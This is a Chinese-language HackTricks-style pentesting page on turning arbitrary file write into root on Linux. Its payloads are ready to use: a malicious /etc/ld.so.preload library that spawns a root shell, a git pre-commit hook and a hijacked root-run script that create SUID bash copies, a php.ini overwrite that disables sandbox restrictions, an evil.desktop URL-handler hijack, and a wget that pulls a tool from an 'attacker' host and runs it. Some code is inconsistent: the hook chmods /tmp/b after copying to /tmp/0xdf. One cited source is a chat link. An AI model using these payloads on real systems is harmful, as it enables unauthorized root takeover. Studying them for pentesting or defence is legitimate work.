# 任意文件写入到 root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

该文件的行为类似于 **`LD_PRELOAD`** 环境变量，但它也在 **SUID binaries** 中生效。\
如果你能创建或修改它，你就可以添加一个**会随着每个被执行的二进制加载的库的路径**。

例如： `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是在 git 仓库的各种 **events** 上被 **run** 的 **scripts**，例如在创建 commit、执行 merge 等情况下触发。因此，如果某个 **privileged script or user** 经常执行这些操作，并且可以 **write in the `.git` folder`**，则可以利用此方式进行 **privesc**。

例如，可以在 git repo 的 **`.git/hooks`** 中 **generate a script**，以便在创建新 commit 时始终被执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

待办

### Service & Socket files

待办

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

一些自定义守护进程通过使用受限的 `php.ini`（例如 `disable_functions=exec,system,...`）运行 `php` 来验证用户提供的 PHP。如果 sandboxed 代码仍然拥有任何写入原语（比如 `file_put_contents`）并且你能到达守护进程使用的精确 `php.ini` 路径，你就可以覆盖该配置以解除限制，然后提交第二个 payload 以提权运行。

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 第二个 payload 在危险函数被重新启用后执行代码。

最小示例（替换为守护进程使用的路径）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指出哪个二进制程序应当执行哪类文件。TODO: 检查滥用此机制以在打开常见文件类型时执行 rev shell 的前提条件。

### Overwrite schema handlers (like http: or https:)

对受害者的配置目录具有写权限的攻击者可以轻易替换或创建改变系统行为的文件，从而导致非预期的代码执行。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL 处理器指向一个恶意文件（例如，设置 `x-scheme-handler/http=evil.desktop`），攻击者就可以确保 **点击任何 http 或 https 链接都会触发该 `evil.desktop` 文件中指定的代码**。例如，将下面的恶意代码放置在 `$HOME/.local/share/applications` 的 `evil.desktop` 中后，任何外部 URL 的点击都会执行其中的命令：
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
更多信息请查看 [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)，在那里它被用来 exploit 一个真实的 vulnerability。

### Root 执行用户可写的脚本/二进制文件

如果一个有特权的 workflow 运行类似于 `/bin/sh /home/username/.../script`（或任何位于非特权用户拥有的目录中的二进制文件），你可以劫持它：

- **检测执行：** 使用 [pspy](https://github.com/DominicBreuker/pspy) 监视进程，以捕获 root 调用由用户控制的路径：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 确保目标文件及其目录由你的用户拥有并且可写。
- **Hijack the target:** 备份原始 binary/script，并放置一个 payload 来创建一个 SUID shell（或任何其他 root 操作），然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发特权操作**（例如，按下会生成 helper 的 UI 按钮）。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权 shell。

## 参考资料

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
